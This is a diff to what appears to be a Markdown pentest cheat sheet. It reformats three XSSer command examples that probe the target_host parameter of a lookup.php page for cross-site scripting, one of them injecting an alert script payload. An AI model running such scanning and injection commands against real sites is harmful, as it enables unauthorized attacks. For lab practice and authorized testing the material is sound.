@@ -309,15 +309,15 @@ var i=new Image;
 > [!success] XSSERS
 > ```
 > xsser --url 'http://example/index.php?page=lookup.php' -p
-'target_host=XSS&lookup-php-submit-button=Lookup+DNS'
+>'target_host=XSS&lookup-php-submit-button=Lookup+DNS'
 > ```
 >```
 > xsser --url 'http://example/index.php?page=lookup.php' -p
-'target_host=XSS&lookup-php-submit-button=Lookup+DNS' --auto
+>'target_host=XSS&lookup-php-submit-button=Lookup+DNS' --auto
 > ```
 > ```
 > xsser --url 'http://example/index.php?page=lookup.php' -p
-'target_host=XSS&lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(365)</script>"
+>'target_host=XSS&lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(365)</script>"
 > ```
 
 
